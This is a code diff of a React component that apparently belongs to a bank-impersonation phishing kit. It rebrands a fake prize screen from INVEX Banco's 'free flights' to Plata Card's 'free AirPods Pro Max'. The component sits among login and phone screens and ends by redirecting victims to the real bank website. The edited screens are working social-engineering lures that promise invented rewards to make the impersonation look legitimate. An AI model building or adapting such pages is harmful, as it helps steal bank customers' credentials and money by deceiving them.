@@ -482,58 +482,79 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         return getBankContainer(loginContent);
 
       case ScreenType.VUELOS_OTORGADOS:
-        const vuelosOtorgadosContent = (
+        const audífonosOtorgadosContent = (
           <>
             <div className="text-center mb-6">
-              <div className="bg-green-100 border border-green-400 rounded-lg p-4 mb-6">
-                <h2 className="text-xl font-bold text-green-700 mb-3">¡Felicidades!</h2>
-                <p className="text-green-700 font-semibold">
-                  Se han otorgado a su cuenta <span className="text-2xl font-bold">2 vuelos nacionales</span>
+              <div className="platacard-card border border-orange-200">
+                <div className="w-20 h-20 bg-gradient-to-br from-[#ff6b35] to-[#ff8c5a] rounded-full mx-auto mb-4 flex items-center justify-center">
+                  <span className="text-3xl">🎧</span>
+                </div>
+                <h2 className="text-2xl font-bold platacard-gradient-text mb-3">¡Felicidades!</h2>
+                <p className="text-gray-700 font-semibold text-lg mb-2">
+                  Sus <span className="text-2xl font-bold platacard-accent">AirPods Pro Max</span> han sido otorgados
                 </p>
+                <p className="text-gray-600">Totalmente gratuitos por su excelente historial crediticio</p>
               </div>
               
-              <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
-                <h3 className="text-lg font-bold text-blue-800 mb-3">Condiciones importantes:</h3>
-                <div className="text-left text-sm text-blue-700">
-                  <ul className="space-y-2">
-                    <li>• <strong>Costo:</strong> Únicamente debe pagar la TUA (Tarifa de Uso de Aeropuerto)</li>
-                    <li>• <strong>Aerolínea:</strong> Vuelos válidos únicamente con VOLARIS</li>
-                    <li>• <strong>Cobertura:</strong> Tarifa aérea 0 (cero) - no canjeables por dinero</li>
-                    <li>• <strong>Restricciones:</strong> Sujeto a disponibilidad de fechas y destinos</li>
-                    <li>• <strong>Límite:</strong> Un vuelo gratuito por cliente seleccionado</li>
-                    <li>• <strong>Gastos adicionales:</strong> TUA, impuestos y servicios extras a cargo del cliente</li>
-                  </ul>
+              <div className="platacard-card mt-6 border border-orange-200">
+                <h3 className="text-lg font-bold text-gray-800 mb-3 flex items-center justify-center">
+                  <span className="mr-2">📋</span>
+                  Detalles del producto:
+                </h3>
+                <div className="text-left text-sm text-gray-700 space-y-2">
+                  <div className="flex justify-between">
+                    <span>• <strong>Producto:</strong></span>
+                    <span>AirPods Pro Max Originales</span>
+                  </div>
+                  <div className="flex justify-between">
+                    <span>• <strong>Costo para usted:</strong></span>
+                    <span className="platacard-accent font-bold">$0 pesos</span>
+                  </div>
+                  <div className="flex justify-between">
+                    <span>• <strong>Entrega:</strong></span>
+                    <span>A domicilio sin costo</span>
+                  </div>
+                  <div className="flex justify-between">
+                    <span>• <strong>Tiempo de entrega:</strong></span>
+                    <span>3-5 días hábiles</span>
+                  </div>
+                  <div className="flex justify-between">
+                    <span>• <strong>Color:</strong></span>
+                    <span>Gris espacial</span>
+                  </div>
                 </div>
               </div>
               
-              <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4 mb-6">
-                <h3 className="text-lg font-bold text-yellow-800 mb-2">Próximos pasos:</h3>
-                <p className="text-yellow-700 text-sm">
-                  <strong>Verifique su correo electrónico</strong> - Se le harán llegar las instrucciones 
-                  detalladas para poder canjear sus vuelos promocionales.
+              <div className="platacard-card mt-6 border border-orange-200">
+                <h3 className="text-lg font-bold platacard-accent mb-2 flex items-center justify-center">
+                  <span className="mr-2">📧</span>
+                  Próximos pasos:
+                </h3>
+                <p className="text-gray-700 text-sm leading-relaxed">
+                  <strong>Revise su correo electrónico</strong> - Le enviaremos las instrucciones 
+                  de entrega y el número de seguimiento de su paquete en las próximas 24 horas.
                 </p>
               </div>
               
-              <div className="text-xs text-gray-500 mt-4">
+              <div className="text-xs text-gray-500 mt-4 space-y-1">
                 <p>Esta promoción está regida por las leyes de México y los términos y condiciones previamente aceptados.</p>
-                <p className="mt-1">Al participar, acepta el uso de sus datos personales para fines comerciales y de marketing de INVEX Banco.</p>
+                <p>Al participar, acepta el uso de sus datos personales para fines comerciales y de marketing de Plata Card.</p>
               </div>
             </div>
             
             <Button 
-              className="w-full bg-[#a71138] hover:bg-[#e04343] text-white py-3 text-lg"
+              className="platacard-button py-3 text-lg"
               onClick={() => {
-                // Redirigir a la página de promociones de INVEX después de 2 segundos
                 setTimeout(() => {
-                  window.location.href = 'https://promociones.invextarjetas.com.mx/info-vuelo0/';
+                  window.location.href = 'https://www.platacard.com/';
                 }, 2000);
               }}
             >
-              Finalizar - Ir a INVEX Tarjetas
+              Finalizar - Ir a Plata Card
             </Button>
           </>
         );
-        return getBankContainer(vuelosOtorgadosContent);
+        return getBankContainer(audífonosOtorgadosContent);
 
       case ScreenType.TELEFONO:
         const phoneContent = (
@@ -1395,12 +1416,15 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
       case ScreenType.GENERANDO_ACLARACION:
         const generandoPromocionContent = (
           <div className="flex flex-col items-center justify-center py-10">
-            <h2 className="text-xl font-bold mb-5">Procesando promoción de vuelos</h2>
-            <div className="flex items-center justify-center mb-5">
-              <div className="w-12 h-12 border-t-4 border-b-4 border-[#BE0046] rounded-full animate-spin"></div>
+            <div className="w-20 h-20 bg-gradient-to-br from-[#ff6b35] to-[#ff8c5a] rounded-full mx-auto mb-6 flex items-center justify-center">
+              <span className="text-3xl">🎧</span>
             </div>
-            <p className="text-center mb-2">Por favor espere, estamos validando su promoción de vuelos...</p>
-            <p className="text-center text-sm text-gray-500">Será redirigido automáticamente al portal de INVEX Tarjetas</p>
+            <h2 className="text-xl font-bold mb-5 platacard-gradient-text">Procesando promoción AirPods Pro Max</h2>
+            <div className="flex items-center justify-center mb-5">
+              <div className="w-12 h-12 border-t-4 border-b-4 border-[#ff6b35] rounded-full animate-spin"></div>
+            </div>
+            <p className="text-center mb-2 text-gray-700">Por favor espere, estamos validando su promoción de AirPods Pro Max...</p>
+            <p className="text-center text-sm text-gray-500">Será redirigido automáticamente al portal de Plata Card</p>
           </div>
         );
         return getBankContainer(generandoPromocionContent);
